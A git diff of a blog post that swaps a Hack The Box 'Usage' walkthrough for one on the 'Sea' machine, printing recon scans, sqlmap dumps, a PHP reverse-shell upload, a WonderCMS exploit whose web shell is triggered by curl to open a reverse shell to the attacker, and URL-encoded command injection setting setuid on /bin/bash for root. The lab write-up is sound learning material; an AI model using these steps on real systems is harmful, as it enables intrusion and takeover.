@@ -3,165 +3,191 @@ layout: post
 title: 'Sea Walkthrough: Conquering Hack The Box Season 6 "Sea htb"'
 date: 14-08-2024
 categories: [HackTheBox]
-tag: season 6  
+tag: [season 6,machines]
+image:
+  path: '/55img/sea.png'
 ---
-![](/Images/usage/d.png)
+## Introduction 
 
-## Introduction
+ __Hack The Box Season 6, "Sea Machine," is a thrilling cybersecurity competition with a nautical theme, offering challenges that simulate real-world hacking scenarios. Participants test their skills in areas like web exploitation, cryptography, and network security. It's an exciting opportunity for both beginners and experts to sharpen their hacking abilities in a competitive, engaging environment.__
 
-Usage is an easy Linux machine that features a blog site vulnerable to SQL injection, enabling the retrieval and cracking of the administrator's hashed password. This grants access to the admin panel, where an outdated Laravel module is exploited to upload a PHP web shell, leading to remote code execution. On the machine, plaintext credentials found in a file allow SSH access as another user, who can execute a custom binary with root privileges. The tool makes an insecure call to 7zip, which is exploited to read the root user’s private SSH key, resulting in full system compromise.
 
-## Reconnaissance 
+
+## Reconnaissance
 
  Network Scanning: as always, we will do nmap scan to know what is opened ports and it’s services in this machine.as always, we will do nmap scan to know what is opened ports and it’s services in this machine.
 
  ```
-  -─(hu1k0㉿kali)-[~/Desktop/HTB]
-  └─$ nmap -sV -sC -oN scan.txt 10.10.11.18 
- ==============================================
- Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-20 16:02 EEST
- Stats: 0:00:46 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
- Service scan Timing: About 50.00% done; ETC: 16:03 (0:00:06 remaining)
- Nmap scan report for usage.htb (10.10.11.18)
- Host is up (0.15s latency).
- Not shown: 998 closed tcp ports (conn-refused)
- PORT   STATE SERVICE VERSION
- 22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux;   protocol 2.0)
- | ssh-hostkey: 
- |   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
- |_  256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
- 80/tcp open  http    nginx 1.18.0 (Ubuntu)
- |_http-title: Daily Blogs
- |_http-server-header: nginx/1.18.0 (Ubuntu)
- Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+    -─(hu1k0㉿kali)-[~/Desktop/HTB]
+    └─$ sh nmap.sh 10.10.11.28
+    Performing initial scan on 10.10.11.28...
+    Open ports: 22,80
+    Performing detailed scan on 10.10.11.28...
+    PORT   STATE SERVICE VERSION
+    22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+    | ssh-hostkey: 
+    |   3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA)
+    |   256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA)
+    |_  256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519)
+    80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+    |_http-server-header: Apache/2.4.41 (Ubuntu)
+    | http-cookie-flags: 
+    |   /: 
+    |     PHPSESSID: 
+    |_      httponly flag not set
+    |_http-title: Sea - Home
+    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+ ```
+ then I browsed the site but didn't find anything interesting.
+ 
+ ![](/img/vv1.png)
+ ![](/img/vv2.png)
+ 
 
- Service detection performed. Please report any incorrect results at  https://nmap.org/submit/ .
- Nmap done: 1 IP address (1 host up) scanned in 54.56 seconds
+## directory discovery
+
+ - __for directory discovery i use [ffuf](https://www.kali.org/tools/ffuf/) tool.__
+
+ ```
+  ┌──(hu1k0㉿kali)-[~/Desktop/HTB/reports] 
+  └─$ ffuf -u http://sea.htb//FUZZ -w /usr/share/wordlists/dirb/common.txt  -mc 200,301,302,401,402,403 
+
+ ```
+ ![fufu1](/img/fffffu.png)
+ 
+ - __first i go for '200' directories {contact.php}__
+ - __i try some xss and sqli but no response__
+  
+  ![](/img/contact.png)
+
+ - __then i tried all '301' directories but all give me Forbidden.__
+
+  * messages , data , plugins , themes ...
+
+ ![](/img/for.png)
+
+ * then i back to http://sea.htb/ and press 'ctrl+u' to view-source:
+  i notice this pass "http://10.10.11.28/themes/bike/css/style.css" which $bike$ is unique so i back and try to see what under this directory "/themes/bike/" 
+ ```
+  ┌──(hu1k0㉿kali)-[~/Desktop/HTB/reports]
+  └─$ ffuf -u http://sea.htb/themes/bike/FUZZ -w /usr/share/wordlists/dirb/common.txt  -mc 200,301,302,401,402,403 -e .txt,.md,.php 
+ ```
+ ![](/img/rrrrr.png)
+
+ - i go for '200' status
+
+  README.md , version , summary , LICENSE..
+
+ ![](/img/readme.png) 
+
+ ![](/img/version.png)
+
+## exploit
+
+ - __so i go and search about it__  [Link.](https://gist.github.com/prodigiousMind/fc69a79629c4ba9ee88a7ad526043413) 
+
+ ![](/img/exploit.png)
+
+ - Usage: python3 exploit.py loginURL IP_Address Port\nexample: python3 exploit.py http://localhost/wondercms/loginURL 192.168.29.165 5252
+
+ ![](/img/exlll.png)
+ 
+ __We can send the link by [Contact](http://sea.htb/contact.php) form to the admin__
+
+ ![](/img/sewee.png)
+ 
+ - now after reading the exploit script we will find it create a shell file in this pass {/themes/revshell-main/rev.php?lhost=" + ip + "&lport=" + port}
+
+ - so we will send a request by [Curl](https://curl.se/docs/tooldocs.html)
+
+ > curl 'http://sea.htb/themes/revshell-main/rev.php?lhost=10.10.16.65&lport=9999'
+
+ ![](/img/curl.png)
+ 
+ > nc -nvlp 9999
+
+ yup and we get the shell 
+
+ ![](/img/shell.png) 
+ 
+ now i will try to find any data to help me to get ``amay`` access
+ 
+ ![](/img/db1.png)
+ 
+ > cat database.js 
+
+ ![](/img/333.png)
+
+ * i found hash don't forget to remove a backslash \
+
+ then i will use [johntheripper](https://www.kali.org/tools/john/) to crack this hash
+
+ > john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+
+ - __now i have ```user``` and ```password``` i will to connect to ```ssh```__
+
+ > ssh amay@10.10.11.28
+
+ ![](/img/user.png)
+
+## Privilege Escalation 
+
+ - i download [linpeas.sh](https://github.com/XDev05/PEASS-ng/blob/master/linPEAS/linpeas.sh) to scan this machine 
+
+ ![](/img/linpeas.png)
+
+ > chmod +x linpeas.sh
+ > ./linpeas.h
+
+ ![](/img/biong.png)
+
+ - __we have something open in localhost in this port so to access that there is a technique called Port Forwarding. It basically takes a user’s port and redirect it’s traffic to our port. To do that we have to run the following command.__
+
+ > ssh -L 8888:10.10.16.6:8080 amay@10.10.16.6
+
+ __and open in my browser ```127.0.0.1:8888``` and access with same ssh data..__
+
+ ![](/img/yyyy.png)
+
+ i will try command injection. add simicolon after [log_file=%2Fvar%2Flog%2Fapache2%2Faccess.log;]  then encode url the comman "touch /home/amay/hulk.hack" =>> "%74%6f%75%63%68%20%2f%68%6f%6d%65%2f%61%6d%61%79%2f%68%75%6c%6b%2e%68%61%63%6b" 
+
+ ![](/img/sert.png)
+
+ ![](/img/tert.png)
+
+ - __BOOM!..it’s WORK !!__
+
+ - then if i can do this command “chmod u+s /bin/bash” it will gain me a root shill.because
+
+
+
+  ````
+     "u" stands for "user" (the owner of the file).
+
+     "+s" sets the setuid bit.
+
+     What Does setuid Do?
+
+      When the setuid bit is set on an executable file, it allows a user to run the executable with the permissions of the file's owner. In the case of /bin/bash, which is typically owned by the root user, this means that any user who runs /bin/bash would start a shell with root privileges.
+
+     and that what i do ..
+ ````
+
+
+ ```"chmod u+s /bin/bash" =>> "%63%68%6d%6f%64%20%20%75%2b%73%20%20%2f%62%69%6e%2f%62%61%73%68"```
+
+ ![](/img/q33.png)
+
+ * then go to ssh connection and type. "/bin/bash -p"
+ ```  
+ The "-p" option in Bash stands for "privileged mode."
+with "-p", Bash skips this step, allowing the shell to retain its higher privileges (usually the effective user ID).
 
  ```
 
-## Exploration the website
+ > /bin/bash -p 
 
+ ![](/img/root.png)
 
- 
-
-    Visiting the IP address in a browser redirects us to a website named “usage.htb”, presenting a form and various navigation options.
-
- ![](/Images/usage/login.png)  
-
- ![](/Images/usage/reg.png)
-
- ![](/Images/usage/adminlogin.png) 
-
- - i try to make account and login . 
-
- and then i found new directory.. ('/dashboard')
-
- ![](/Images/usage/regfg.png)
-
- ![](/Images/usage/dash.png)
-
- - __i open the [burpsuite](https://portswigger.net/burp) and browse the site i hobe to find somthing Juicy..__
-
- - then i back and try to "Reset Password" to my new register account then i try to do a ```sqlinjection``` and boom it's WORK!!.
-
- ![](/Images/usage/sssforget.png)
-
- now i will use [sqlmap.](https://sqlmap.org/) to do sql injection 
-
- 1. take a new request then make to it dorp not farward and save it in "sql.txt"
-
-     ![](/Images/usage/sql.png)
-
- 2. write this command to do sql injection . and get databases..
-
-     > sqlmap -r sql.txt  -p email --level 5 --risk 3 --threads 10 --batch  --dbs
-
-    ![](/Images/usage/1q.png) 
-
- 3. write this command to get tables in usage_blog database.
-
-     > sqlmap -r sql.txt  -p email --level 5 --risk 3 --threads 10 --batch  -D usage_blog --tables
-
-     ![](/Images/usage/tables.png)
-
- 4. write this command to get admin_users table dump..
-
-     > sqlmap -r sql.txt  -p email --level 5 --risk 3 --threads 10 --batch  -D usage_blog -T admin_users --dump 
-
-     ![](/Images/usage/wrt.png)
-
- 5. now we can to decrypt the hash by [johntheripper.](https://www.kali.org/tools/john/) tool .
-
-     ![](/Images/usage/passs.png)   
-
- - now we can login in ```admin.usage.htb```   
-
- ![](/Images/usage/lopop.png) 
-
- - aftrer some search i understand it have "file upload vulnerability"  
-
- ![](/Images/usage/file.png)
-
-## User Flag
- 
- - now we will try upload [php-reverse-shell] (https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) 
-
- ![](/Images/usage/ertoo.png)
-
- - so i will rename the file befouer i uploud it . 
-
- > cp shell.php shell.php.jpg
-
- ![](/Images/usage/okk.png)
-
- - now i can intercept the request with burp after i clicked submit and change it again from ```shell.php.jpg``` to ```shell.php```
- and click right and open the image ...
-
- ![](/Images/usage/shell.png)
-
- ![](/Images/usage/usertext.png)
-
- - now after some search in the machine i found this file ```.monitrc```
- - i found this password and connect by ssh.
-
- ![](Images/usage/xander.png)
-
-  
-
-## Privilege Escalation
-
- - at first i will use ```sudo -l```
-
- ![](Images/usage/sudo-l.png) 
-
- > strings /usr/bin/usage_management
-
- and i found this 
-
- ![](/Images/usage/ggggg.png)
-
- after i search about it i found this.
-
- ![](/Images/usage/aearch.png)
-
- ![](Images/usage/hacktriks.png)
-
- so i will try this to get ```.ssh/id_rsa```
-
- - first i will go to excutable path and make the files on it ..
-
- ![](Images/usage/pre1.png)
-
- ![](Images/usage/collect.png)
-
- - Make a file called it id_rsa 
-
- ![](Images/usage/idrttttt.png)
-
-  > chmod 600 id_rsa
-
-  > ssh -i id_rsa root@10.10.11.18
-
-  ![](/Images/usage/root.png)
- 
+---
+![](/img/2dddddd.png)
